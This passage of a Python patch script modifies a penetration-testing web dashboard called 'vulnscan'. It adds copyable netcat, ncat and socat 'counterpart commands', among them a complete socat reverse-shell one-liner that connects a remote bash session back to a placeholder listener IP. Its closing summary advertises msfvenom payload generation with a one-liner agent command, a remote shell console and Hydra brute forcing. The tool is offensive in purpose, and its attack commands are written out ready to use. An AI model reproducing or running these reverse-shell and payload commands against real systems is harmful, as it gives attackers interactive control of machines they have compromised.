  finally{btn.disabled=false;btn.innerHTML='GENERATE PAYLOAD';}
}

// Init msfvenom page when navigated to
(function _msfInit(){
  var origPg=pg;
  // Monkey-patch pg to detect msfvenom page open
  pg=function(id,el){
    origPg.apply(this,arguments);
    if(id==='msfvenom'){
      setTimeout(function(){
        msfLoadIP();
        msfPayloadChanged();
      },200);
    }
  };
})();'''

patch_file(SERVER, "msfvenom: complete JS rewrite", OLD_MSF_JS, NEW_MSF_JS)

# ══════════════════════════════════════════════════════════════
# PATCH 5 — Netcat/Ncat/Socat: show counterpart command
# ══════════════════════════════════════════════════════════════

OLD_NETCAT_RES = '''    var d=await r.json();ncTool.end();if(d.error){ncTool.err(d.error);}else{ncTool.log('Netcat command completed','s');renderSocialTool(ncTool,d);}
  }catch(e){ncTool.end();ncTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NETCAT';}
}'''

NEW_NETCAT_RES = '''    var d=await r.json();ncTool.end();if(d.error){ncTool.err(d.error);}else{
      ncTool.log('Netcat command completed','s');
      // Show counterpart command
      var counterEl=document.getElementById('nc-counterpart');
      if(counterEl){
        var cCmd='';var cNote='';
        if(mode==='listen'){
          cCmd='nc '+host+' '+port;
          cNote='Run this on the REMOTE system to connect to your listener:';
        }else{
          cCmd='nc -lvnp '+port;
          cNote='Run this on YOUR system FIRST to listen for the connection:';
        }
        counterEl.innerHTML='<div style="margin-top:10px;background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--cyan);border-radius:var(--radius);padding:10px 14px">'
          +'<div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-bottom:6px">COUNTERPART COMMAND</div>'
          +'<div style="font-size:11px;color:var(--text2);margin-bottom:6px">'+cNote+'</div>'
          +'<div style="display:flex;gap:6px"><input class="inp inp-mono" type="text" value="'+cCmd+'" readonly style="flex:1;font-size:11px;color:var(--green)"/>'
          +'<button class="btn btn-outline btn-sm" onclick="navigator.clipboard.writeText(\''+cCmd+'\').then(function(){showToast(\'Copied\',\'\',\'success\',1500);})">COPY</button></div>'
          +'</div>';
      }
      renderSocialTool(ncTool,d);
    }
  }catch(e){ncTool.end();ncTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NETCAT';}
}'''

patch_file(SERVER, "Netcat: show counterpart command", OLD_NETCAT_RES, NEW_NETCAT_RES)

# Add counterpart div to netcat page
OLD_NETCAT_PAGE_ERR = "        <div class=\"err-box\" id=\"nc-err\"></div>\n        <div id=\"nc-res\"></div>\n      </div>"
NEW_NETCAT_PAGE_ERR = "        <div class=\"err-box\" id=\"nc-err\"></div>\n        <div id=\"nc-counterpart\"></div>\n        <div id=\"nc-res\"></div>\n      </div>"
patch_file(SERVER, "Netcat: add counterpart div", OLD_NETCAT_PAGE_ERR, NEW_NETCAT_PAGE_ERR)

# Ncat counterpart
OLD_NCAT_RES = '''    var d=await r.json();nctTool.end();if(d.error){nctTool.err(d.error);}else{nctTool.log('Ncat command completed','s');renderSocialTool(nctTool,d);}
  }catch(e){nctTool.end();nctTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NCAT';}
}'''

NEW_NCAT_RES = '''    var d=await r.json();nctTool.end();if(d.error){nctTool.err(d.error);}else{
      nctTool.log('Ncat command completed','s');
      var counterEl=document.getElementById('nct-counterpart');
      if(counterEl){
        var cCmd2='',cNote2='';
        if(mode==='listen'){
          cCmd2='ncat '+host+' '+port;
          cNote2='Run on REMOTE system to connect to your listener:';
        }else{
          cCmd2='ncat -lvnp '+port;
          cNote2='Run on YOUR system FIRST to listen:';
        }
        counterEl.innerHTML='<div style="margin-top:10px;background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--cyan);border-radius:var(--radius);padding:10px 14px">'
          +'<div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-bottom:6px">COUNTERPART COMMAND</div>'
          +'<div style="font-size:11px;color:var(--text2);margin-bottom:6px">'+cNote2+'</div>'
          +'<div style="display:flex;gap:6px"><input class="inp inp-mono" type="text" value="'+cCmd2+'" readonly style="flex:1;font-size:11px;color:var(--green)"/>'
          +'<button class="btn btn-outline btn-sm" onclick="navigator.clipboard.writeText(\''+cCmd2+'\').then(function(){showToast(\'Copied\',\'\',\'success\',1500);})">COPY</button></div>'
          +'</div>';
      }
      renderSocialTool(nctTool,d);
    }
  }catch(e){nctTool.end();nctTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NCAT';}
}'''

patch_file(SERVER, "Ncat: show counterpart command", OLD_NCAT_RES, NEW_NCAT_RES)

OLD_NCAT_PAGE_ERR = "        <div class=\"err-box\" id=\"nct-err\"></div>\n        <div id=\"nct-res\"></div>\n      </div>"
NEW_NCAT_PAGE_ERR = "        <div class=\"err-box\" id=\"nct-err\"></div>\n        <div id=\"nct-counterpart\"></div>\n        <div id=\"nct-res\"></div>\n      </div>"
patch_file(SERVER, "Ncat: add counterpart div", OLD_NCAT_PAGE_ERR, NEW_NCAT_PAGE_ERR)

# Socat counterpart
OLD_SOCAT_RES = '''    var d=await r.json();scTool.end();if(d.error){scTool.err(d.error);}else{scTool.log('Socat command completed','s');renderSocialTool(scTool,d);}
  }catch(e){scTool.end();scTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN SOCAT';}
}'''

NEW_SOCAT_RES = '''    var d=await r.json();scTool.end();if(d.error){scTool.err(d.error);}else{
      scTool.log('Socat command completed','s');
      var counterEl=document.getElementById('sc-counterpart');
      if(counterEl){
        // Parse left/right to determine which side is the listener
        var leftStr=document.getElementById('sc-left').value.trim();
        var rightStr=document.getElementById('sc-right').value.trim();
        var isListen=leftStr.toUpperCase().indexOf('LISTEN')>=0;
        var cCmds=[];
        if(isListen){
          // Extract port from listener
          var portMatch=leftStr.match(/:([0-9]+)/);
          var listenPort=portMatch?portMatch[1]:'PORT';
          cCmds.push({desc:'Connect from remote system:',cmd:'socat - TCP:YOUR_LISTENER_IP:'+listenPort});
          cCmds.push({desc:'Reverse shell on remote (bash):',cmd:'socat exec:\\'bash -li\\',pty,stderr,setsid,sigint,sane TCP:YOUR_LISTENER_IP:'+listenPort});
        }else{
          var portMatch2=leftStr.match(/:([0-9]+)/);
          var lPort2=portMatch2?portMatch2[1]:'4444';
          cCmds.push({desc:'Listener on your system:',cmd:'socat TCP-LISTEN:'+lPort2+',reuseaddr,fork -'});
        }
        var html='<div style="margin-top:10px;background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--cyan);border-radius:var(--radius);padding:10px 14px">'
          +'<div style="font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-bottom:8px">COUNTERPART COMMANDS</div>';
        cCmds.forEach(function(cc){
          html+='<div style="margin-bottom:8px"><div style="font-size:11px;color:var(--text2);margin-bottom:5px">'+cc.desc+'</div>'
            +'<div style="display:flex;gap:6px"><input class="inp inp-mono" type="text" value="'+cc.cmd+'" readonly style="flex:1;font-size:11px;color:var(--green)"/>'
            +'<button class="btn btn-outline btn-sm" onclick="navigator.clipboard.writeText(\''+cc.cmd.replace(/'/g,"\\'")+'\')" >COPY</button></div></div>';
        });
        html+='</div>';
        counterEl.innerHTML=html;
      }
      renderSocialTool(scTool,d);
    }
  }catch(e){scTool.end();scTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN SOCAT';}
}'''

patch_file(SERVER, "Socat: show counterpart commands", OLD_SOCAT_RES, NEW_SOCAT_RES)

OLD_SOCAT_PAGE_ERR = "        <div class=\"err-box\" id=\"sc-err\"></div>\n        <div id=\"sc-res\"></div>\n      </div>"
NEW_SOCAT_PAGE_ERR = "        <div class=\"err-box\" id=\"sc-err\"></div>\n        <div id=\"sc-counterpart\"></div>\n        <div id=\"sc-res\"></div>\n      </div>"
patch_file(SERVER, "Socat: add counterpart div", OLD_SOCAT_PAGE_ERR, NEW_SOCAT_PAGE_ERR)

# ══════════════════════════════════════════════════════════════
# Syntax check
# ══════════════════════════════════════════════════════════════
import subprocess, sys
print()
print(BOLD + "  Syntax check:" + RESET)
result = subprocess.run([sys.executable, "-m", "py_compile", SERVER], capture_output=True, text=True)
if result.returncode == 0:
    ok(f"{SERVER} — syntax OK")
else:
    fail(f"{SERVER} — SYNTAX ERROR:\n    {result.stderr.strip()}")
    warn("Restore backup: cp api_server.py.*.bak api_server.py")

print()
print(BOLD + CYAN + "══════════════════════════════════════════════════════" + RESET)
print(f"  {YELLOW}Restart server:{RESET}")
print(f"    sudo systemctl restart vulnscan")
print(f"    OR: python3 api_server.py")
print()
print(f"  {GREEN}Changes applied:{RESET}")
print(f"    {GREEN}✓{RESET}  Legion: SMB (nmap scripts), smbclient, SNMP (snmpwalk), Hydra, finger")
print(f"    {GREEN}✓{RESET}  SearchSploit: formatted table with type, copy path, EDB link, CSV export")
print(f"    {GREEN}✓{RESET}  SecLists: 'Copy ALL Entries' + 'Download' buttons (up to 200k entries)")
print(f"    {GREEN}✓{RESET}  msfvenom: auto payload options, public IP LHOST, one-liner agent cmd")
print(f"    {GREEN}✓{RESET}  msfvenom: Session Dashboard tab + Remote Shell console")
print(f"    {GREEN}✓{RESET}  Netcat/Ncat/Socat: counterpart command shown after run")
print()
print(f"  {YELLOW}Requirements for new features:{RESET}")
print(f"    SMB:      sudo apt install smbclient nmap")
print(f"    SNMP:     sudo apt install snmp snmpwalk")  
print(f"    Hydra:    sudo apt install hydra")
print(f"    MSF:      sudo apt install metasploit-framework")
print(f"    Public IP: server needs outbound internet access")
print()
